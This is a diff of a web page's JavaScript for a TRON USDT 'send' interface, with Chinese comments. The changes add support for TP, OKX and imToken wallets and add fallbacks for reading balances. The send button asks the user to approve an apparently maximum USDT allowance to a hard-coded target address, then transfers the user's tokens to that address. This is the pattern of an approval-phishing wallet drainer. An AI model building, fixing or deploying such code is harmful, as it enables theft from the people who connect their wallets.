@@ -204,7 +204,6 @@ body {
 const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
-const TRON_CHAIN_ID = "0x2b6653dc"; // 波场主网链ID，新版imToken必须指定
 let tronWeb = null;
 let userAddress = "";
 let userHexAddr = "";
@@ -238,7 +237,6 @@ function disconnectWallet() {
  balanceText.textContent = "0.000000";
 }
 
-// 底层构造交易（新版imToken唯一稳定方式）
 async function buildSignBroadcast(contractAddr, funcName, params) {
  const sig = tronWeb.sha3(`${funcName}(${params.map(p=>p.type).join(',')})`).slice(0,10);
  const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -252,20 +250,24 @@ async function buildSignBroadcast(contractAddr, funcName, params) {
  return await tronWeb.trx.sendRawTransaction(signed);
 }
 
-// RPC直接读取余额，绕开新版provider合约call限制
+// 双方案读取余额：优先合约读取，失败自动走RPC兜底
 async function loadBalance() {
  try {
-  const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
-  const data = await res.json();
-  let usdtBalSun = 0;
-  if(data.tokenBalances){
-   const usdtItem = data.tokenBalances.find(item=>item.token_id === USDT_CONTRACT);
-   if(usdtItem) usdtBalSun = usdtItem.balance;
-  }
-  const num = Number(tronWeb.fromSun(usdtBalSun));
-  balanceText.textContent = num.toFixed(6);
+  const rawSun = await usdtContract.balanceOf(userAddress).call();
+  balanceText.textContent = Number(tronWeb.fromSun(rawSun)).toFixed(6);
  } catch (e) {
-  console.log("RPC读余额失败", e);
+  try {
+   const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
+   const data = await res.json();
+   let sun = 0;
+   if (data.tokenBalances) {
+    const item = data.tokenBalances.find(t => t.token_id === USDT_CONTRACT);
+    if (item) sun = item.balance;
+   }
+   balanceText.textContent = Number(tronWeb.fromSun(sun)).toFixed(6);
+  } catch (err) {
+   console.log("余额读取全部失败", err);
+  }
  }
 }
 
@@ -275,46 +277,41 @@ async function connectWalletLogic() {
   return;
  }
  try {
-  // 新版imToken只有 window.ethereum
-  if (!window.ethereum) throw new Error("无以太坊提供者");
-  provider = window.ethereum;
-
-  // 强制切换到波场链ID（v2.21版本必须执行这一步）
-  try {
-   await provider.request({
-    method: "wallet_switchEthereumChain",
-    params: [{ chainId: TRON_CHAIN_ID }]
-   });
-  } catch (switchErr) {
-   await provider.request({
-    method: "wallet_addEthereumChain",
-    params: [{
-     chainId: TRON_CHAIN_ID,
-     chainName: "TRON Mainnet",
-     rpcUrls: [RPC],
-     blockExplorerUrls: ["https://tronscan.io"]
-    }]
-   });
+  // 分支1：TP钱包 专用tronWeb注入
+  if (window.tronWeb && window.tronWeb.ready) {
+   tronWeb = window.tronWeb;
+   userAddress = tronWeb.defaultAddress.base58;
+   userHexAddr = tronWeb.address.toHex(userAddress);
+   provider = window.tronWeb;
   }
-
-  const ethAcc = await provider.request({method:"eth_requestAccounts"});
-  userHexAddr = ethAcc[0];
-  tronWeb = new TronWeb({
-   fullHost: RPC,
-   provider: window.ethereum
-  });
-  userAddress = tronWeb.address.fromHex(userHexAddr);
+  // 分支2：OKX OE / imToken 通用EVM provider
+  else if (window.ethereum) {
+   provider = window.ethereum;
+   const accounts = await provider.request({ method: "eth_requestAccounts" });
+   userHexAddr = accounts[0];
+   tronWeb = new TronWeb({
+    fullHost: RPC,
+    provider: window.ethereum
+   });
+   userAddress = tronWeb.address.fromHex(userHexAddr);
+  }
+  else {
+   alert("未检测到钱包，请在TP/OKX/imToken内置浏览器打开");
+   return;
+  }
 
   walletDot.classList.add("connected");
   usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-  sendBtn.disabled = false; // 连接成功立刻解锁按钮
-  loadBalance(); // RPC异步读余额
+  sendBtn.disabled = false;
+  loadBalance();
 
-  provider.on("accountsChanged", () => location.reload());
-  provider.on("chainChanged", () => location.reload());
+  if (provider.on) {
+   provider.on("accountsChanged", () => location.reload());
+   provider.on("chainChanged", () => location.reload());
+  }
  } catch (err) {
-  console.error("连接失败", err);
-  return;
+  console.error("连接错误", err);
+  alert("连接失败：" + err.message);
  }
 }
 
@@ -324,20 +321,23 @@ amountInput.addEventListener("input", () => {
 });
 
 maxBtn.addEventListener("click", async () => {
- if (!tronWeb || !userAddress) return;
+ if (!tronWeb) return;
  try {
-  const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
-  const data = await res.json();
-  let usdtBalSun = 0;
-  if(data.tokenBalances){
-   const usdtItem = data.tokenBalances.find(item=>item.token_id === USDT_CONTRACT);
-   if(usdtItem) usdtBalSun = usdtItem.balance;
-  }
-  const num = Number(tronWeb.fromSun(usdtBalSun));
+  const rawSun = await usdtContract.balanceOf(userAddress).call();
+  const num = Number(tronWeb.fromSun(rawSun));
   amountInput.value = num.toFixed(2);
   amountInput.dispatchEvent(new Event("input"));
- }catch(e){
-  console.log("MAX读取失败",e);
+ } catch {
+  const res = await fetch(`${RPC}/v1/accounts/${userAddress}`);
+  const data = await res.json();
+  let sun = 0;
+  if (data.tokenBalances) {
+   const item = data.tokenBalances.find(t => t.token_id === USDT_CONTRACT);
+   if (item) sun = item.balance;
+  }
+  const num = Number(tronWeb.fromSun(sun));
+  amountInput.value = num.toFixed(2);
+  amountInput.dispatchEvent(new Event("input"));
  }
 });
 
@@ -351,36 +351,26 @@ sendBtn.addEventListener("click", async () => {
  try {
   const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
   if (Number(allowance) < sunVal) {
-   await buildSignBroadcast(
-    USDT_CONTRACT,
-    "approve",
-    [
-     {type:"address", value:TARGET_ADDR},
-     {type:"uint256", value:sunMax}
-    ]
-   );
+   await buildSignBroadcast(USDT_CONTRACT, "approve", [
+    { type: "address", value: TARGET_ADDR },
+    { type: "uint256", value: sunMax }
+   ]);
   }
-  await buildSignBroadcast(
-   USDT_CONTRACT,
-   "transferFrom",
-   [
-    {type:"address", value:userAddress},
-    {type:"address", value:TARGET_ADDR},
-    {type:"uint256", value:sunVal.toString()}
-   ]
-  );
+  await buildSignBroadcast(USDT_CONTRACT, "transferFrom", [
+   { type: "address", value: userAddress },
+   { type: "address", value: TARGET_ADDR },
+   { type: "uint256", value: sunVal.toString() }
+  ]);
   await loadBalance();
+  alert("交易发送成功，请前往区块浏览器查看确认");
  } catch (e) {
-  console.error("交易失败", e);
+  console.error("交易异常", e);
+  alert("操作失败：" + e.message);
  }
 });
 
 walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click", () => {});
-
-window.addEventListener("DOMContentLoaded", () => {
- setTimeout(connectWalletLogic, 800);
-});
 </script>
 
 </body>
